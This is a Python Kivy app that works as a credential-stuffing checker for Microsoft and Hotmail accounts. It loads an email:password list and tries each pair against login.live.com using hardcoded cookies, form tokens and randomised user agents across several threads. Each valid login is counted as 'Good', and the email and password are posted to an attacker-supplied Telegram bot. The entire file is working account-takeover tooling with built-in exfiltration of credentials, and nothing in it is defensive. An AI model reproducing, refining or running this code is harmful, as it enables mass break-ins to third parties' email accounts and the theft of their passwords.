import threading
import requests
from concurrent.futures import ThreadPoolExecutor
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.graphics import Color, Rectangle
from kivy.metrics import dp
from kivy.clock import Clock
from user_agent import generate_user_agent
from plyer import storage
class LoginApp(BoxLayout):
    def __init__(self, **kwargs):
        super(LoginApp, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = dp(20)
        self.spacing = dp(15)

        with self.canvas.before:
            Color(0.9, 0.95, 1, 1)
            self.rect = Rectangle(size=self.size, pos=self.pos)

        self.bind(size=self._update_rect, pos=self._update_rect)

        self.result_label = Label(
            size_hint_y=None,
            height=dp(50),
            text='Good: 0 - Bad: 0',
            color=(0, 0, 0, 1),
            font_size='20sp'
        )
        self.add_widget(self.result_label)

        self.path_input = self.create_input('Path Accounts : ')
        self.token_input = self.create_input('Bot Token')
        self.id_input = self.create_input('Telegram ID')

        self.submit_button = Button(
            text='Start Check',
            size_hint_y=None,
            height=dp(50),
            background_color=(0.2, 0.6, 1, 1),
            color=(1, 1, 1, 1)
        )
        self.submit_button.bind(on_press=self.check_accounts)
        self.add_widget(self.submit_button)

        self.good_count = 0
        self.bad_count = 0
        self.popup = None
        self.request_permissions()
       
    def request_permissions(self):
        
        storage.request_permissions()
    def create_input(self, hint_text):
        input_field = TextInput(
            hint_text=hint_text,
            multiline=False,
            size_hint_y=None,
            height=dp(40),
            background_color=(1, 1, 1, 1),
            foreground_color=(0, 0, 0, 1),
            padding=(dp(10), dp(10))
        )
        self.add_widget(input_field)
        return input_field

    def _update_rect(self, instance, value):
        self.rect.pos = self.pos
        self.rect.size = self.size

    def check_accounts(self, instance):
        filepath = self.path_input.text.strip()
        bot_token = self.token_input.text.strip()
        telegram_id = self.id_input.text.strip()

        if filepath and bot_token and telegram_id:
            threading.Thread(target=self.process_file, args=(filepath, bot_token, telegram_id)).start()
            self.result_label.text = "Checking accounts..."
        else:
            self.show_popup("Error", "Please fill in all fields.")

    def process_file(self, filepath, bot_token, telegram_id):
        try:
            with open(filepath, 'r') as file:
                accounts = file.readlines()

            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.verify_account, account.strip(), bot_token, telegram_id) for account in accounts]

                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        Clock.schedule_once(lambda dt: self.show_popup("Error", str(e)))

        except Exception as e:
            Clock.schedule_once(lambda dt: self.show_popup("Error", f"Could not open file: {str(e)}"))

    def verify_account(self, account, bot_token, telegram_id):
        try:
            username, password = account.split(':')
            cookies = {
                          'DIDC': 'ct%3D1715611312%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C521_BL2.0.D.CihCZ5MeZv07QHpi1oGLUObTjfPJNlAWdmJTerB/aGckGIrDa3JcfeHRy3yCwLwru0YZlBgOHsjMyhNihE0ucZHz%252BjWQscqNU0m1JxoTRFK6mD87gHIyhWe577x/2TqmV8Uhqs/C/jG0gde3wycG/X8O%252Bq4tBj8joLtrEb/947L9gn7llfYxJkqhQIW%252Bk3mh9NDMCBS9kZ7V%252B5TB7dJWlHlzOvsSclRvcDmHY/jExst2pKrCFhy7nLOjLYA39T7Fr7rqv4dfTMcY2425HvhHa1pM4md0eFPALU5udsDhVk3OcbtTpUIoRFa3IvYqqm1UoVe3cFiR58gWXec4ITFuFpJfCEhU97OF%252B%252BooE7XJEyi/RKDa1cLE7xy9V35atGgf5wNbB/RfiJF9xLphKmg8lFQjB5OOYvRkN/bUL2uJwEsx40hQ/F/lcD3ApTns4ARH7KbukXyu%252ByMqI/J/dagTo6LOZQNanGVUPZHqjEmZoTPqWxa4//ZXzSz8s%252BaEsBUFdYdH2%252B7MquuNizk8yGueZxQ%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DOwceQRxd1LedkeGWbNBlq3oAw%252BSvtO6K%26hash%3D2Hh5prTG7LIf26nt9%252BEd%252BDC90kEP6p5CKJLTqZyqjUQ%253D%26dd%3D1',
                          'DIDCL': 'ct%3D1715611312%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C521_BL2.0.D.CihCZ5MeZv07QHpi1oGLUObTjfPJNlAWdmJTerB/aGckGIrDa3JcfeHRy3yCwLwru0YZlBgOHsjMyhNihE0ucZHz%252BjWQscqNU0m1JxoTRFK6mD87gHIyhWe577x/2TqmV8Uhqs/C/jG0gde3wycG/X8O%252Bq4tBj8joLtrEb/947L9gn7llfYxJkqhQIW%252Bk3mh9NDMCBS9kZ7V%252B5TB7dJWlHlzOvsSclRvcDmHY/jExst2pKrCFhy7nLOjLYA39T7Fr7rqv4dfTMcY2425HvhHa1pM4md0eFPALU5udsDhVk3OcbtTpUIoRFa3IvYqqm1UoVe3cFiR58gWXec4ITFuFpJfCEhU97OF%252B%252BooE7XJEyi/RKDa1cLE7xy9V35atGgf5wNbB/RfiJF9xLphKmg8lFQjB5OOYvRkN/bUL2uJwEsx40hQ/F/lcD3ApTns4ARH7KbukXyu%252ByMqI/J/dagTo6LOZQNanGVUPZHqjEmZoTPqWxa4//ZXzSz8s%252BaEsBUFdYdH2%252B7MquuNizk8yGueZxQ%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DOwceQRxd1LedkeGWbNBlq3oAw%252BSvtO6K%26hash%3D2Hh5prTG7LIf26nt9%252BEd%252BDC90kEP6p5CKJLTqZyqjUQ%253D%26dd%3D1',
                      'uaid': '5294cb15462e4cdca3e36aacafb140c5',
                      'MSPRequ': 'id=292841&lt=1715611285&co=1',
                      'MSCC': '105.72.130.83-MA',
                      'OParams': '11O.DpkHz1ouyExiwnZ53QLKhRmwtC8m6YSWVYRY8fhHPStIrfg5R6josBqs0kzIigmHv8jCVwRBLnDBGHtDfIvlfEOHaxP*FhkBR*A3d*A6Eu7t!EMkAz0bDFggWbWyDGLCBPS6uN3xHqmq38NSNgpzAxKHkGOrmfqxNz2mdnuIuFtb1wu6i8RBfekn7Tbw5HfzRfSM3WTQdl1RUB3cfMaKD*VF93nYHQiegPFzvedCN5p9lmwoxe157IH5hDcKQq2QG0ljd9nULRQxjfFnRwpqSAfA*nHCREf3aLoDEfYcf8ZZvYpdmbgUhUqnpeo80pAMOfVfAlfYk4n!0Mem167lblo5DtXNnj831sQFouM5XxlRhrj4V5lPOYHISWWEJC*x9xNxdEBt0j!YRi9fz3jYLgVYy14UFYZyJY5wGWLJzc4fvLt!HnZbkEQCLqSFz*IEYRxIuuv0jw4Ld*aVNJCyg6kejd6fma8DLOWCb2N!iMvUAN0EIlxoR3eQKOxjL6dX0w$$',
    'MicrosoftApplicationsTelemetryDeviceId': '0bbef4be-d401-452a-87e1-239bdb5cb946',
    'ai_session': 'NM6SyAS5dP4qKOJx/EUARV|1715611284973|1715611284973',
    'MSFPC': 'GUID=3fc7493806be47fb8f2126ed224b538a&HASH=3fc7&LV=202405&V=4&LU=1715611271403',
    'MSPOK': '$uuid-f699df22-050f-4c98-81ab-4963527b2342$uuid-e6ae5bc5-db4b-467c-af53-945f1bab6117',
}
            headers = {
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                           'Accept-Language': 'en-US,en;q=0.9',
                           'Cache-Control': 'max-age=0',
                           'Connection': 'keep-alive',
                           'Content-Type': 'application/x-www-form-urlencoded',
                          'DNT': '1',
                          'Origin': 'https://login.live.com',
                          'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1715611271&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26deeplink%3dowa%252f%253frealm%253dhotmail.com%26RpsCsrfState%3dbf2f0edc-6572-6b98-b85d-746987c01495&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
                         'Sec-Fetch-Dest': 'document',
                         'Sec-Fetch-Mode': 'navigate',
                         'Sec-Fetch-Site': 'same-origin',
                         'Sec-Fetch-User': '?1',
                         'Upgrade-Insecure-Requests': '1',
                         'User-Agent':'{}'.format(generate_user_agent()),
                         'X-Edge-Shopping-Flag': '0',
}
            params = {
                          'cobrandid': 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
                         'id': '292841',
                         'contextid': '3997129C59DECFD9',
                         'opid':'BBE7479BF4903A57',
                         'bk': '1715611285',
                         'uaid':'5294cb15462e4cdca3e36aacafb140c5',
                         'pid': '0',
}
            data = {
                        'ps': '2',
                        'psRNGCDefaultType': '',
                        'psRNGCEntropy': '',
                        'psRNGCSLK': '',
                        'canary': '',
                        'ctx': '',
                        'hpgrequestid': '',
                        'PPFT': '-Dipiss8GhwpKKzYzVDFFjyyGajTP0cm2dmK4t0duHa5xXdEOX05n8S2AhyufXndxPQCzUazlj81NTeAzrWFoDb5MYCiuwNaWYNWrjwRxGhyrjExObB7fYUGVy8m4v5r4QZaLpOUdZVfZEz*!lWXeatBNXQ90sRK3tekkZMifCeEnvKaQaXMSaljNRrMBw0YPipzpOVZCYuKDpcmGG5Ho6QmCCc5QYo0Xf!HI*2O5s5ky',
                        'PPSX': 'Passpor',
                        'NewUser': '1',
                        'FoundMSAs': '',
                        'fspost': '0',
                        'i21': '0',
                        'CookieDisclosure': '0',
                        'IsFidoSupported': '1',
                        'isSignupPost': '0',
                        'isRecoveryAttemptPost': '0',
                        'i13': '0',
                        'login': '{}'.format(username),
                        'loginfmt':'{}'.format(username),
                        'type': '11',
                        'LoginOptions': '3',
                        'lrt': '',
                        'lrtPartition': '',
                        'hisRegion': '',
                        'hisScaleUnit': '',
                        'passwd': '{}'.format(password),
                    }
            response = requests.post(
                'https://login.live.com/ppsecure/post.srf',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data
            ).cookies.get_dict()

            if '__Host-MSAAUTH' in response:
                self.good_count += 1
                self.send_to_telegram(bot_token, telegram_id, username, password)
            else:
                self.bad_count += 1

            Clock.schedule_once(self.update_results)

        except Exception as e:
            raise Exception(f"Error processing account {account}: {str(e)}")

    def send_to_telegram(self, bot_token, telegram_id, username, password):
        message = f"Done Account\nEmail: {username}\nPassword: {password}"
        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={telegram_id}&text={message}")

    def update_results(self, dt):
        self.result_label.text = f'Good: {self.good_count} - Bad: {self.bad_count}'

    def show_popup(self, title, message):
        if self.popup:
            self.popup.dismiss()
        self.popup = Popup(title=title, content=Label(text=message), size_hint=(0.8, 0.4))
        self.popup.open()

class MyApp(App):
    def build(self):
        return LoginApp()

if __name__ == '__main__':
    MyApp().run()
